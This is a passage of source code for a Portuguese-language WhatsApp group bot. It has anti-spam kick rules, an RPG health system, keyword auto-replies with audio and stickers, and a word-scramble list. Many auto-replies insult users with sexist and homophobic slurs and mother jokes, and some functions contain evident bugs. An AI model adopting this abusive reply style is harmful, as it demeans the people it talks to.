if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

//_ANTI TEXTO EM "GRUPOS" ATIVAR/DESATIVAR
if (budy.length > 3500) {
if (!isGroup) return
if (!isAntitexto) return
if (isGroupAdmins) return reply('Cuidado com a quantidade de caracteres isso pode ser um trava mas como você é adm não vou te banir.')
reply(`「 *TRAVA ACHADA* 」\nNossos sistema Detectou Vestigios De Travas De spam\n Por segurança estamos de removendo `)
loli.groupRemove(from, [sender])
await loli.blockUser(from, [sender])
}

//_ANTI CONTATOS EM INGLÊS
if (contact.includes(type)){
if (!isGroup) return
if (!isAntictt) return
if (isGroupAdmins) return reply(`Adm?`)     
reply(`「 *TRAVA ACHADA* 」\nNossos sistema Detectou Vestigios De Travas De CONTATO\n Por segurança estamos de removendo `)
loli.groupRemove(from, [sender])
await loli.blockUser(from, [sender])
}
}






/*if (budy.match('k')) {
const tt1 = {
text:  `Gay @${sender.split('@')[0]}...`,
contextInfo: {
mentionedJid: [sender]
}
 }
return reply(tt1)}
}*/

/*
loli.sendMessage(antitexto, "Ligações = block", MessageType.text)
        setTimeout(async() => {
            await loli.blockUser(antitexto, from)
*/

/*if (document.includes(type)){
if (isGroup) return
console.log('[\x1b[1;31mPV\x1b[1;37m]', time, color('Sujeito enviando travas'), 'do', color(pushname))
reply('Travas = block')
setTimeout(async() => {
await loli.blockUser(from)
}, 4000)
}

if (contact.includes(type)){
if (isGroup) console.log('[\x1b[1;31mPV\x1b[1;37m]', time, color('Sujeito enviando travas'), 'do', color(pushname))
setTimeout(async() => {
await loli.blockUser(from)
}, 4000)
}*/

/*if (budy.length > 3500) {
if (!isGroup) return
if (!isAntitexto) return
if (isGroupAdmins) return reply('adm?')
reply('▓▓▓▓\n▒▒▒▓▓\n▒▒▒▒▒▓ *dEsTrAvA*\n▒▒▒▒▒▒▓ *AtUaLizAdA*\n▒▒▒▒▒▒▓ *Do*\n▒▒▒▒▒▒▒▓ *dAvIzInMaKeR*\n▒▒▒▒▒▒▒▓▓▓\n▒▓▓▓▓▓▓░░░▓\n▒▓░░░░▓░░░░▓\n▓░░░░░░▓░▓░▓\n▓░░░░░░▓░░░▓\n▓░░▓░░░▓▓▓▓\n▒▓░░░░▓▒▒▒▒▓\n▒▒▓▓▓▓▒▒▒▒▒▓\n▒▒▒▒▒▒▒▒▓▓▓▓\n▒▒▒▒▒▓▓▓▒▒▒▒▓\n▒▒▒▒▓▒▒▒▒▒▒▒▒▓\n▒▒▒▓▒▒▒▒▒▒▒▒▒▓\n▒▒▓▒▒▒▒▒▒▒▒▒▒▒▓\n▒▓▒▓▒▒▒▒▒▒▒▒▒▓\n▒▓▒▓▓▓▓▓▓▓▓▓▓\n▒▓▒▒▒▒▒▒▒▓\n▒▒▓▒▒▒▒▒▓\n'.repeat(20))
reply(`「 *TRAVA ACHADA* 」\nNossos sistema Detector Vestigios De Travas De spam\n Por segurança estamos de removendo `)
loli.groupSettingChange(from, GroupSettingChange.messageSend, true)		
setTimeout(() =>{
loli.groupRemove(from, [sender])
}, 2000)
setTimeout( () => {
loli.groupSettingChange(from, GroupSettingChange.messageSend, false)
}, 8000)
}
}*/

////FINALIZAR TTT AUTOMATICAMENTE
if (tttset.tttstatus == "off" && tttset.autoEndTime == "on") {
tttset.autoEndTime = "off"
} else if (tttset.tttstatus == "on" && tttset.autoEndTime == "on") {
if (isLevelingOn) {
const randomEndTTTXP = 0 - (Math.floor(Math.random() * 800) + 75)
addLevelingXp(tttset.player, randomEndTTTXP)
const checkTTTIdEnd = getTTTId(tttset.player)
if (checkTTTIdEnd === undefined) addTTTId(tttset.player)
addTTTpoints(tttset.player, randomEndTTTXP)
loli.sendMessage(tttset.local,`❌ O TEMPO DE JOGO EXPIROU ❌\n\n➣  PUNIÇÃO: ${randomEndTTTXP} XP 🔮`, text, {quoted: tttset.mentionPlayer})
} else {
loli.sendMessage(tttset.local,`❌ O TEMPO DE JOGO EXPIROU ❌`, text, {quoted: tttset.mentionPlayer})
}
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.autoEndTime = "off"
}
const getHeal = (sender) => {
        	let position = false
              Object.keys(_healt).forEach ((i) => {
              	if (_healt[position].id === sender) {
              	   position = i
                  }
              })
             if (position !== false) {
                return _healt[position].healt
            }
        }


            const healtAdd = (sender) => {
             let position = false
            Object.keys(_healt).forEach((i) => {
                if (_healt[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _healt[position].healt += 10
                fs.writeFileSync('./lib/rpg/healt.json', JSON.stringify(_healt))
            }
        }

//funtion limited

           const isHealt = (sender) =>{ 
		      let position = false
              for (let i of _healt) {
              if (i.id === sender) {
              	let healts = i.healt
              if (healts >= healtawal ) {
              	  position = true
                    loli.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                    return true
              } else {
              	_healt
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, healt: 1 }
                _healt.push(obj)
                fs.writeFileSync('./lib/rpg/healt.json',JSON.stringify(_healt))
           return false
       }
     }

const bayarHealt = (sender, amount) => {
        	let position = false
            Object.keys(_healt).forEach((i) => {
                if (_healt[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _healt[position].healt -= amount
                if (_healt[position].healt >= 0) return reply('sua saúde está cheia')
                fs.writeFileSync('./lib/rpg/healt.json', JSON.stringify(_healt))
            }
        }
       
 
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    loli.sendMessage(to, media, type, { quoted: say1, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
const checkHealt = (sender) => {
          	let found = false
                    for (let lmt of _healt) {
                        if (lmt.id === sender) {
                            const healthCounts = healtawal - lmt.healt
                            if (healthCounts <= 0) return loli.sendMessage(from,`Sua solicitação de limite se esgotou\n\n_Observação: o limite será redefinido a cada 21:00!_`, text,{ quoted: mek})
                          //  loli.sendMessage(from, `${healthCounts}`, text, { quoted : mek})
                           if (!isPetualang) return reply(mess.only.player)
 reqXp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
pp = monospace(`📍 𝗽𝗲𝗿𝗳𝗶𝗹 𝗮𝘃𝗲𝗻𝘁𝘂𝗿𝗲𝗶𝗿𝗼
 • Nome : ${pushname}
 • Rank : ${role}
 • Status : ${elit}
 • Cash : $${(getBalance(sender, balance))}
 • Xp : ${getLevelingXp(sender)}/${reqXp}
 • Level : ${getLevelingLevel(sender)}
 
🎒 𝗜𝗻𝘃𝗲𝗻𝘁𝗼𝗿𝗶 :
 • Cash: $${(getBalance(sender, balance))}💰
 • Ouro : ${getEmas(sender)}🪙
 • Ferro : ${getBesi(sender)}⛓️
 • Diamante : ${getDm(sender)}💎
 • Peixe : ${getFish(sender)}🎣
🏔️ 𝗠𝗲𝗻𝘂 𝗥𝗣𝗚
 • joinrpg
 • quest ( otw )
 • mining
 • mancing
 • adventure
 • myinventori
 • topleaderboard
 
🛒 𝗦𝗲𝗹𝗹 𝗜𝗻𝘃𝗲𝗻𝘁𝗼𝗿𝘆
 • sellikan
 • sellbesi
 • sellemas
 • selldiamond`)
		 const but = [{ buttonId: `${prefix}menu`, buttonText: { displayText: 'Back To Menu' }, type: 1 }]
          sendButton(from, pp, 'rpg game', but)
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, healt: 1 }
                        _healt.push(obj)
                        fs.writeFileSync('./lib/rpg/healt.json', JSON.stringify(_healt))
                        loli.sendMessage(from, `${healthCounts}`, text, { quoted : mek})
                    }
				}

            
            const runtime = function(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " dia, " : " Dia, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hora, " : " Hora, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minuto, " : " Minuto, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " segundos" : " Segundos") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}
	
	if (messagesC.includes("fdp")){
			loli.updatePresence(from, Presence.composing)
			reply("teu pai")
	}
	
		if (messagesC.includes("kkkkkk")){
			loli.updatePresence(from, Presence.composing)
			reply("kskskskk")
	}
	
			if (messagesC.includes("lixo")){
			loli.updatePresence(from, Presence.composing)
			reply("por acaso eu sou vc agr?")
	}
	
				if (messagesC.includes("linda")){
			loli.updatePresence(from, Presence.composing)
			reply("obgd meu amor")
	}
	
				if (messagesC.includes("fcc")){
			loli.updatePresence(from, Presence.composing)
			reply("ainda existe isso? KKKKKKKKK")
	}
	
			if (messagesC.includes("but")){
			loli.updatePresence(from, Presence.composing)
			reply("é bot seu analfabeto")
	}
	
				if (messagesC.includes("amor")){
			loli.updatePresence(from, Presence.composing)
			reply("oii mb, falou cmg? 🥺")
	}
	
			if (messagesC.includes("Horibot")){
			loli.updatePresence(from, Presence.composing)
			reply("oiii")
	}
	
			if (messagesC.includes("bem?")){
			loli.updatePresence(from, Presence.composing)
			reply("to bem, vlw por perguntar 😏")
	}
	
	
			if (messagesC.includes("chato")){
			loli.updatePresence(from, Presence.composing)
			reply("nossa 🥺")
	}
	
			if (messagesC.includes("vadia")){
			loli.updatePresence(from, Presence.composing)
			reply("ai mano, vc acha legal usar um argumento machista?")
	}
	
			if (messagesC.includes("lua")){
			loli.updatePresence(from, Presence.composing)
			reply("amo ela")
	}
	
		if (messagesC.includes("corno")){
			loli.updatePresence(from, Presence.composing)
			reply("vsfd seu merda")
	}
	
		if (messagesC.includes("tmnc")){
			loli.updatePresence(from, Presence.composing)
			reply("vai vc, tu ja me disse q é mo bom")
	}
	
		if (messagesC.includes("vsfd")){
			loli.updatePresence(from, Presence.composing)
			reply("bora juntos?")
	}
	
		if (messagesC.includes("cade bot")){
			loli.updatePresence(from, Presence.composing)
			reply("olha eu aqui carai")
	}
	
		if (messagesC.includes("in4defi7nido7839")){
			loli.updatePresence(from, Presence.composing)
			reply("indenfinido78492")
	}
	
			if (messagesC.includes("bah")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/fdp.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
				if (messagesC.includes("oii")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/ola.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
			if(bidy.includes('cade o bot') && isAutoReply) return reply('Me chamou onii-chan')
			if(bidy.includes('bot fdp') && isAutoReply) return reply('Te foder rapaz, te deitar na porrada quando tiver dormindo')
			if(bidy.includes('bot gostosa') && isAutoReply) return reply('Arigato go sai masu')
			if(bidy.includes('bot fofa') && isAutoReply) return reply('Arigato go sai masu')
			if(bidy.includes('bot baianor') && isAutoReply) return reply('Convidei sua placa-mae pra minha rede seu corno')
			if(bidy.includes('bot corno') && isAutoReply) return reply('Vai te foder, jogador de ff, comprador de pack de pé, VOCÊ E DOENÇA')
			if(bidy.includes('bot feio') && isAutoReply) return reply('Feia a tua mãe aquela sem dente')
			if(bidy.includes('bot puta') && isAutoReply) return reply('Tua mãe que ta na esquina esperando o idoso rico')
			if(bidy.includes('bot gay') && isAutoReply) return reply('Falou o manja rola')
			if(bidy.includes('bot viado') && isAutoReply) return reply('Falou o manja rola')
			if(bidy.includes(botNumber+' feia') && isAutoReply) return reply('Feia a tua mãe aquela sem dente')
			if(bidy.includes('bot linda') && isAutoReply) {
				buff = await getBuffer('https://i.imgur.com/4G7qutd.jpg')
				loli.sendMessage(from, buff, image, {quoted: mek, thumbnail:null, caption: 'Bakaaaa☺'})
			}
			if(bidy.includes('bom dia') && isAutoReply) {
				buff = await getBuffer('https://i.imgur.com/SCfQnJ1.jpg')
				tujuh = fs.readFileSync('./assets/ohayo.mp3');
				loli.sendMessage(from, buff, image, {quoted: mek, thumbnail:null, caption: 'Ohayou Gozaimasu, ja tomou cafe da manhã?⛾'})
				loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
			}
			if(bidy.includes('boa tarde') && isAutoReply) {
				buff = await getBuffer('https://i.imgur.com/WbVjibE.jpg')
				tujuh = fs.readFileSync('./assets/tarde.mp3');
				loli.sendMessage(from, buff, image, {quoted: mek, thumbnail:null, caption: 'Konnichiwa, Metade do dia chegou🌅'})
				loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
			}
			if(bidy.includes('boa noite') && isAutoReply) {
				buff = await getBuffer('https://i.imgur.com/q348epY.jpg')
				tujuh = fs.readFileSync('./assets/noite.mp3');
				teks = 'Konbanwa Onii-chan,até amanhã 🌌❤️'
				loli.sendMessage(from, buff, image, {quoted: mek, thumbnail:null, caption: 'Konbanwa Onii-chan,até amanhã 🌌❤️'})
				loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
			}
			
//msc
	
					if (messagesC.includes("hylander")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/hylander.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
						if (messagesC.includes("cmflamengo")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/cmflamengo.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
						if (messagesC.includes("cmgremio")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/cmgremio.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
						if (messagesC.includes("m4")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/m4.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
						if (messagesC.includes("macaverde")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/macaverde.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
						if (messagesC.includes("kalidade")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/kalidade.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
						if (messagesC.includes("nikeb")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/nikeb.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
			if (messagesC.includes("banhodeleite")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/BanhoDeLeite.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
				if (messagesC.includes("akdoflamengo")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/akdoflamengo.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
					if (messagesC.includes("nemo")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/nemo.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
			if (messagesC.includes("canta")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/canto.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
               if ((budy === "Fofa") || (budy === "fofa")) {
               result = fs.readFileSync(`./assets/hori.webp`)
               loli.sendMessage(from, result, sticker, {quoted: mek })
         }

if (budy.match('Hori')) {
const figu = ["1","2","1","3","4","5","9","6","7","8"]
fiu = figu[Math.floor(Math.random() * figu.length)]
figs = fs.readFileSync('./figs/'+fiu+'.webp')
loli.sendMessage(from, figs, sticker, {quoted: mek})
}
if (budy.match('HORI')) {
const figu = ["1","2","1","3","4","5","9","6","7","8"]
fiu = figu[Math.floor(Math.random() * figu.length)]
figs = fs.readFileSync('./figs/'+fiu+'.webp')
loli.sendMessage(from, figs, sticker, {quoted: mek})
} 
	
	
//msc fim
	
					if (messagesC.includes("grita")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/a.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
			if (messagesC.includes("bv")){
			loli.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/bv.mp3');
            loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
				if (messagesC.includes("digita")){
			loli.updatePresence(from, Presence.composing)
            tod = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTbUSEUrWrhJqPJ6simouSXGNgZTN7-lNnRQS1GClVAnAY3fMlyuqbVpTQ&s=10`)
            loli.sendMessage(from, tod, image, { quoted: mek, thumbnail:null, caption: 'como matar a raça humana, opa to fazendo uma pesquisa skzkksskzkskzkzzk'})                  
	}
                               if (messagesC.includes("mae")){
			loli.updatePresence(from, Presence.composing)
            tod = await getBuffer(`https://a-static.mlcdn.com.br/1500x1500/tapete-em-lona-espaco-planeta-terra-luz-do-sol-fabrika-de-festa/fabrikadefesta/552576820/ba7fe118090c658e335adda6b11b7154.jpg`)
            loli.sendMessage(from, tod, image, { quoted: mek, thumbnail:null, caption: 'aqui está uma bela imagem de sua querida mãe🥰'})                  
	}
if (messagesC.includes("zadik")){
			loli.updatePresence(from, Presence.composing)
            tod = await getBuffer(`https://i.imgur.com/Qg84hKK.png`)
            loli.sendMessage(from, tod, image, { quoted: mek, thumbnail:null, caption: 'ta chamando o chefe?'})                  
	}
                      if (messagesC.includes("mãe")){
			loli.updatePresence(from, Presence.composing)
            tod = await getBuffer(`https://a-static.mlcdn.com.br/1500x1500/tapete-em-lona-espaco-planeta-terra-luz-do-sol-fabrika-de-festa/fabrikadefesta/552576820/ba7fe118090c658e335adda6b11b7154.jpg`)
            loli.sendMessage(from, tod, image, { quoted: mek, thumbnail:null, caption: 'aqui está uma bela imagem de sua querida mãe🥰'})                  
	}
					if (messagesC.includes("machista")){
			loli.updatePresence(from, Presence.composing)
            tod = await getBuffer(`https://cdn17.picsart.com/70797778849.gif?to=min&r=640`)
            loli.sendMessage(from, tod, image, { quoted: mek, thumbnail:null, caption: 'Voce chama isso de machismo?? sua puta.'})                  
	}
			if(isAntiLoc && isBotGroupAdmins && type === MessageType.location) {
				if(isGroupAdmins) return loli.sendMessage(from,'*Adms podem enviar mensagens proibidas*', MessageType.text, {quoted: mek})
				loli.sendMessage(from, '*Corra membro comum o ban esta proximo*')
				setTimeout(async function () {
					loli.groupRemove(from, [sender])
				}, 1000)
			}
			if(isAntictt && isBotGroupAdmins && type === MessageType.contact) {
				if(isGroupAdmins) return loli.sendMessage(from,'*Adms podem enviar mensagens proibidas*', MessageType.text, {quoted: mek})
				loli.sendMessage(from, '*Corra membro comum o ban esta proximo*')
				setTimeout(async function () {
					loli.groupRemove(from, [sender])
				}, 1000)
				}
			if(isAntiDoc && isBotGroupAdmins && type === MessageType.document) {
				if(isGroupAdmins) return loli.sendMessage(from,'*Adms podem enviar mensagens proibidas*', MessageType.text, {quoted: mek})
				loli.sendMessage(from, '*Corra membro comum o ban esta proximo*')
				setTimeout(async function () {
					loli.groupRemove(from, [sender])
				}, 1000)
			}
				
				let palavrasANA = [
{
original: 'PARADOXO',
embaralhada: 'XOPARODA',
dica: 'CANAL'
},
{
original: 'ESCADA',
embaralhada: 'CAESDA',
dica: 'OBJETO'
},
{
original: 'AKAME',
embaralhada: 'MEAKA',
dica: 'PERSONAGEM'
},
{
original: 'JOELHO',
embaralhada: 'JOLOEH',
dica: 'CORPO HUMANO'
},
{ 
original: 'PEDRA',
embaralhada: 'RAPED',
dica: 'MATERIAL'
},
{ 
original: 'CONSOANTES',
embaralhada: 'OANSSTOECN',
dica: 'FONEMA'
},
{ 
original: 'ACORDADO',
embaralhada: 'RDAACOOD',
dica: 'LIGADO'
},
{ 
original: 'DROGA',
embaralhada: 'ORGAD',
dica: 'PROERD'
},
{ 
original: 'VOLUME',
embaralhada: 'EULMVO',
dica: 'AUMENTAR'
},
{
original: 'ASSINATURA',
embaralhada: 'INSTAURAS',
dica: 'ESCREVER'
},
{
original: 'NOTAS',
embaralhada: 'TSOAN',
dica: 'NUMEROS '
},
{
original: 'SOLDADOS',
embaralhada: 'LAOSSDOD',
dica: 'EXÉRCITO'
},
{
original: 'COLHER',
embaralhada: 'CHEORL',
dica: 'TALHER'
},
{
original: 'JAPÃO',
embaralhada: 'JÃPOA',
dica: 'PAIS'
},
{
original: 'ASSENTO',
embaralhada: 'NSASETO',
dica: 'ACONCHEGAR'
},
{
original: 'RONCO',
embaralhada: 'NOCRO',
dica: 'DORMIR'
},
{
original: 'VIOLONCELO',
embaralhada: 'NEILLOCOOV',
dica: 'INSTRUMENTO'
},
{
original: 'HOMOSSEXUAL',
embaralhada: 'EHSSOMAULXO',
dica: 'GENERO'
},
{
original: 'HOMOSSEXUAL',
embaralhada: 'EHSSOMAULXO',
dica: 'GENERO'
},
{
original: 'CRESCER',
embaralhada: 'ECCRRES',
dica: 'NASCER'
},
{
original: 'MONUMENTO',
embaralhada: 'NUNMMOTOE',
dica: 'ABANDONADO'
},
{
original: 'HOSPITAL',
embaralhada: 'OALISTHP',
dica: 'LUGAR'
},
{
original: 'ALEMANHA',
embaralhada: 'AEMLAHAN',
dica: 'PAIS'
},
{
original: 'INESPERADO',
embaralhada: 'NROEISPEAD',
dica: 'SURPRESA'
},
{
original: 'AMENDOIM',
embaralhada: 'ADONMIME',
dica: 'COMIDA'
},
{
original: 'CAMERA',
embaralhada: 'EACMRA',
dica: 'FOTO'
},
{
original: 'ENCADERNADO',
embaralhada: 'DRNAEEONACD',
dica: 'CADERNO'
},
{
original: 'INOCENTE',
embaralhada: 'INETONCE',
dica: 'SUSPEITO'
},
{
original: 'EXPLORAR',
embaralhada: 'XRELRPAO',
dica: 'VERIFICAR'
},
{
original: 'VACINA',
embaralhada: 'VACNAI',
dica: 'COVID'
},
{
original: 'DINOSSAURO',
embaralhada: 'AUSIODOSNR',
dica: 'PRE-HISTORICO'
},
{
original: 'NAGATORO',
embaralhada: 'GATONARO',
dica: 'PERSONAGEM'
},
{
original: 'SASUKE',
embaralhada: 'KESUSA',
dica: 'PERSONAGEM'
},
{
original: 'GAY',
embaralhada: 'YAG',
dica: 'VOCÊ'
},
{
original: 'CIMENTO',
embaralhada: 'OMCNITE',
dica: 'CONSTRUÇÕES'
},
{
original: 'BANANA',
embaralhada: 'NABANA',
dica: 'COMIDA'
},
{
original: 'NETFLIX',
embaralhada: 'TFLIXNE',
dica: 'APLICATIVO'
},
{
original: 'YOUTUBE',
embaralhada: 'TUBEYOU',
dica: 'APLICATIVO'
},
{
original: 'PORTUGAL',
embaralhada: 'TUGALPOR',
dica: 'PAÍS'
},
{
original: 'PISTOLA',
embaralhada: 'TOPISLA',
dica: 'OBJETO'
},
		
{
original: 'CAMARÃO',
embaralhada: 'MARÃOCA',
dica: 'COMIDA'
},
{
original: 'HIDRANTE',
embaralhada: 'TEHDIRAN',
dica: 'OBJETO'
},
{
original: 'FOGUETE',
embaralhada: 'TEFOGUE',
dica: 'OBJETO'
},
{
original: 'SKATE',
embaralhada: 'TEASK',
dica: 'OBJETO'
},
{
original: 'MACACO',
embaralhada: 'CACOMA',
dica: 'ANIMAL'
},
{
original: 'LASANHA',
embaralhada: 'NHASALA',
dica: 'COMIDA'
},
{
original: 'PASTEL',
embaralhada: 'PATELS',
dica: 'COMIDA'
},
{
original: 'COXINHA',
embaralhada: 'XICONHA',
dica: 'COMIDA'
},
{
original: 'BICICLETA',
embaralhada: 'CIBITACLE',
dica: 'OBJETO'
},
{
original: 'SASUKE',
embaralhada: 'ESASUK',
dica: 'PERSONAGEM'
},
{
original: 'CAVALO',
embaralhada: 'LACAVO',
dica: 'ANIMAL'
},
{
original: 'LEVI',
embaralhada: 'EVIL',
dica: 'PERSONAGEM'
},
{
original: 'KAMAITACHI',
embaralhada: 'TAICAMAKHI',
dica: 'CANTOR'
},
{
original: 'LUBA',
embaralhada: 'UBAL',
dica: 'YOUTUBER'
},
{
original: 'GRÊMIO',
embaralhada: 'OMÊGRI',
dica: 'TIME'
},
{
original: 'SATURNO',
embaralhada: 'UTARSON',
dica: 'PLANETA'
},
{
original: 'MIKASA',
embaralhada: 'KAMISA',
dica: 'PERSONAGEM'
},
{
original: 'LEÃO',
embaralhada: 'OLEÃ',
dica: 'ANIMAL'
},
{
original: 'SAKURA',
embaralhada: 'SUKARA',
dica: 'PERSONAGEM'
},
{
original: 'HADES',
embaralhada: 'SEDAH',
dica: 'MITOLOGIA'
},
{
original: 'CORRIDA',
embaralhada: 'ARROCID',
dica: 'ESPORTE'
},
{
original: 'ODIN',
embaralhada: 'NODI',
dica: 'MITOLOGIA'
},
{
original: 'BICICLETA',
embaralhada: 'CIBITACLE',
dica: 'OBJETO'
},
{
original: 'BICICLETA',
embaralhada: 'CIBITACLE',
dica: 'OBJETO'
},
{
original: 'GUATEMALA',
embaralhada: 'LATEMAGUA',
dica: 'PAÍS'
},
{
original: 'CEREJA',
embaralhada: 'ECREJA',
dica: 'FRUTA'
},
{
original: 'VENEZUELA',
embaralhada: 'ZUNEEVELA',
dica: 'PAÍS'
},
{
original: 'HISTÓRIA',
embaralhada: 'TÓRISIAH',
dica: 'MATÉRIA'
},
{
original: 'INSTAGRAM',
embaralhada: 'TAGRAMINS',
dica: 'APLICATIVO'
},
{
original: 'WHATSAPP',
embaralhada: 'TSWHAAPP',
dica: 'APLICATIVO'
},
{
original: 'HIDRANTE',
embaralhada: 'TEHDIRAN',
dica: 'OBJETO'
},
{
original: 'CELULAR',
embaralhada: 'CELARLU',
dica: 'OBJETO'
},
{
original: 'NOTEBOOK',
embaralhada: 'TENOBOOK',
dica: 'OBJETO'
},
{
original: 'COMPUTADOR',
embaralhada: 'PUCOMDORTA',
dica: 'OBJETO'
},
{
original: 'LANTERNA',
embaralhada: 'TERLANNA',
dica: 'OBJETO'
},
{
original: 'CACHORRO',
embaralhada: 'HRROAOCC',
dica: 'ANIMAL'
},
{
original: 'DESENTUPIDOR',
embaralhada: 'SENDETUDORPI',
dica: 'OBJETO'
},
{
original: 'TOMATE',
embaralhada: 'ATEMOT',
dica: 'ALIMENTO'
},
{
original: 'SAXOFONE',
embaralhada: 'ASXOEOFN',
dica: 'INSTRUMENTO MUSICAL'
},
{
original: 'CAZAQUISTÃO',
embaralhada: 'ZAACQIUSÃOT',
dica: 'PAÍS'
},
{
original: 'CROÁCIA',
embaralhada: 'CRCÁOAI',
dica: 'PAÍS'
},
{
original: 'HUNGRIA',
embaralhada: 'UHGINRA',
dica: 'PAÍS'
},
{
original: 'MEGAFONE',
embaralhada: 'MOEFGNEA',
dica: 'OBJETO'
},
{
original: 'CINTURA',
embaralhada: 'RCIANUT',
dica: 'CORPO HUMANO'
},
{
original: 'ABDÔMEN',
embaralhada: 'MBÔDENA',
dica: 'CORPO HUMANO'
},
{
original: 'VAGNER',
embaralhada: 'GNEVAR',
dica: 'NOME'
},
{
original: 'HENPLAY',
embaralhada: 'HPNYALE',
dica: 'NOME'
},
{  
original: 'FACIN',
embaralhada: 'NFCIA',
dica: 'TIPO DE GAY'
},
{    
original: 'ZADIK',
embaralhada: 'KAIDZ',
dica: 'NOME'
},
{
original: 'RAPOSA',
embaralhada: 'APRSAO',
dica: 'ANIMAL'
},
{
original: 'INFERNO',
embaralhada: 'RNOFNIE',
dica: 'LUGAR'
},
{   
original: 'RINOCERONTE',
embaralhada: 'NTERRECNIOO',
dica: 'ANIMAL'
},
{ 
original: 'PASTOR',
embaralhada: 'STRPAO',
dica: 'BATIZADO'
},
{
original: 'BONITO',
embaralhada: 'NTBIOO',
dica: 'COMENTÁRIO'
},
{
original: 'ARQUEOLOGO',
embaralhada: 'AOOGLQOURE',
dica: 'PROFISSAO'
},
{
original: 'ARANHA',
embaralhada: 'RAHAAN',
dica: 'ANIMAL'
},
{
original: 'MARIPOSA',
embaralhada: 'ASIRAOPM',
dica: 'ANIMAL'
},
{
original: 'PINGUIM',
embaralhada: 'NPUIMGI',
dica: 'ANIMAL'
},
